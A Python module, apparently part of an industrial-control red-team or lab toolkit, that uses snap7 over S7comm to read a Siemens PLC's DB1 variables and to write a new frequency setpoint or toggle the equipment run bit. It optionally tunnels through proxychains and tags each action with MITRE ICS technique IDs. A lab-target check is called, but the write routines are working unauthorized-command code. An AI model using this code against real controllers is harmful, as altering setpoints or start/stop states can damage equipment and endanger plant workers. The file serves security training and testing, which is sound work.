#!/usr/bin/env python3
"""Ataques Siemens S7comm (snap7): lectura DB1 y escritura setpoint/marcha.

Mapa DB1 del simulador:
    DBW0 INT  Temperatura (ºC)
    DBW2 INT  Presión (bar)
    DBX4.0 BOOL  Marcha
    DBX4.1 BOOL  Parada emergencia
    DBD6 REAL  Setpoint (Hz)
"""

import config
from core import runner, evidence

try:
    import snap7
    from snap7.util import get_int, get_bool, get_real, set_real, set_bool
    _SNAP7_OK = True
except Exception as _e:  # noqa: BLE001
    _SNAP7_OK = False
    _SNAP7_ERR = str(_e)


# Las funciones públicas (read_db1, write_setpoint, write_marcha) lanzan un
# subproceso `python3 -m modules._cli.s7_cli` para que proxychains pueda
# interceptar las llamadas C de snap7 cuando toca pasar por el túnel SOCKS.
# Las _do_* son la implementación real que corre dentro de ese subproceso.

def _connect(ip, rack, slot, sink):
    if not _SNAP7_OK:
        sink(f"[!] La librería 'snap7' no está disponible: {_SNAP7_ERR}")
        sink("    Instala con: pip3 install python-snap7")
        return None
    client = snap7.client.Client()
    try:
        client.connect(ip, rack, slot)
    except Exception as e:  # noqa: BLE001
        sink(f"[-] No se pudo conectar al PLC {ip}: {e}")
        return None
    if not client.get_connected():
        sink(f"[-] No se pudo conectar al PLC {ip}.")
        return None
    sink(f"[+] Conectado correctamente al PLC S7 en {ip}")
    return client


def _do_read_db1(ip, rack, slot, sink):
    client = _connect(ip, rack, slot, sink)
    if client is None:
        return
    try:
        db1 = client.db_read(db_number=1, start=0, size=10)
        temperatura = get_int(db1, 0)
        presion = get_int(db1, 2)
        marcha = get_bool(db1, 4, 0)
        parada = get_bool(db1, 4, 1)
        setpoint = get_real(db1, 6)
        sink("==========================================")
        sink("          LECTURA DE VARIABLES (DB1)      ")
        sink("==========================================")
        sink(f"  [*] Temperatura (DB1.DBW0): {temperatura} ºC")
        sink(f"  [*] Presión     (DB1.DBW2): {presion} bar")
        sink(f"  [*] Marcha      (DB1.DBX4.0): {marcha}")
        sink(f"  [*] Parada Emerg(DB1.DBX4.1): {parada}")
        sink(f"  [*] Setpoint    (DB1.DBD6): {setpoint:.2f} Hz")
        sink("==========================================")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error leyendo DB1: {e}")
    finally:
        client.disconnect()
        sink("[+] Conexión cerrada.")


def _do_write_setpoint(ip, rack, slot, valor, sink):
    client = _connect(ip, rack, slot, sink)
    if client is None:
        return
    try:
        sink(f"[*] Enviando nuevo Setpoint ({valor} Hz) a DB1.DBD6...")
        buffer_hz = bytearray(4)
        set_real(buffer_hz, 0, float(valor))
        client.db_write(db_number=1, start=6, data=buffer_hz)
        sink("  [OK] Escritura de Setpoint completada.")
        db1 = client.db_read(db_number=1, start=0, size=10)
        sink(f"  [*] Setpoint tras escritura: {get_real(db1, 6):.2f} Hz")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error escribiendo setpoint: {e}")
    finally:
        client.disconnect()
        sink("[+] Sesión S7comm finalizada.")


def _do_write_marcha(ip, rack, slot, valor, sink):
    valor = str(valor).lower() in ("1", "true", "on", "yes") if isinstance(valor, str) else bool(valor)
    client = _connect(ip, rack, slot, sink)
    if client is None:
        return
    try:
        sink(f"[*] Modificando bit de Marcha a {valor} en DB1.DBX4.0...")
        byte_4 = client.db_read(db_number=1, start=4, size=1)
        set_bool(byte_4, byte_index=0, bool_index=0, value=valor)
        client.db_write(db_number=1, start=4, data=byte_4)
        sink(f"  [OK] Estado de Marcha actualizado a {valor}.")
        db1 = client.db_read(db_number=1, start=0, size=10)
        sink(f"  [*] Marcha      (DB1.DBX4.0): {get_bool(db1, 4, 0)}")
        sink(f"  [*] Parada Emerg(DB1.DBX4.1): {get_bool(db1, 4, 1)}")
    except Exception as e:  # noqa: BLE001
        sink(f"[!] Error escribiendo bit de marcha: {e}")
    finally:
        client.disconnect()
        sink("[+] Sesión S7comm finalizada.")


def _launch_cli(action, args, path, sink):
    cmd = ["python3", "-m", "modules._cli.s7_cli", action] + args
    cmd = runner.wrap_proxy(cmd)
    runner.run_command(cmd, path, sink=sink, timeout=60, cwd=config.BASE_DIR)


def read_db1(target=None, rack=None, slot=None, sink=None):
    """Lee las 5 variables de DB1 (T0861 - Point Property Read)."""
    ip = runner.assert_lab_target(target or config.S7_DEFAULT_TARGET)
    rack = config.S7_DEFAULT_RACK if rack is None else rack
    slot = config.S7_DEFAULT_SLOT if slot is None else slot
    path = evidence.new_evidence_file("s7", "read_db1")
    evidence.header(path, "Siemens S7 - Lectura de variables (DB1)",
                    f"{ip} rack={rack} slot={slot}", config.MITRE_MAP["s7.read_db1"])
    _launch_cli("read_db1",
                ["--target", ip, "--rack", str(rack), "--slot", str(slot)],
                path, sink)
    return path


def write_setpoint(target=None, rack=None, slot=None, valor=75.5, sink=None):
    """Escribe el setpoint REAL en DB1.DBD6 (T0836 - Modify Parameter)."""
    ip = runner.assert_lab_target(target or config.S7_DEFAULT_TARGET)
    rack = config.S7_DEFAULT_RACK if rack is None else rack
    slot = config.S7_DEFAULT_SLOT if slot is None else slot
    path = evidence.new_evidence_file("s7", "write_setpoint")
    evidence.header(path, "Siemens S7 - Escritura de Setpoint (DB1.DBD6, REAL)",
                    f"{ip} -> {valor} Hz", config.MITRE_MAP["s7.write_setpoint"])
    _launch_cli("write_setpoint",
                ["--target", ip, "--rack", str(rack), "--slot", str(slot),
                 "--valor", str(valor)],
                path, sink)
    return path


def write_marcha(target=None, rack=None, slot=None, valor=True, sink=None):
    """Escribe el bit de Marcha DB1.DBX4.0 (T0855 - Unauthorized Command Message)."""
    ip = runner.assert_lab_target(target or config.S7_DEFAULT_TARGET)
    rack = config.S7_DEFAULT_RACK if rack is None else rack
    slot = config.S7_DEFAULT_SLOT if slot is None else slot
    path = evidence.new_evidence_file("s7", "write_marcha")
    evidence.header(path, "Siemens S7 - Escritura de bit Marcha (DB1.DBX4.0, BOOL)",
                    f"{ip} -> {valor}", config.MITRE_MAP["s7.write_marcha"])
    _launch_cli("write_marcha",
                ["--target", ip, "--rack", str(rack), "--slot", str(slot),
                 "--valor", str(valor)],
                path, sink)
    return path
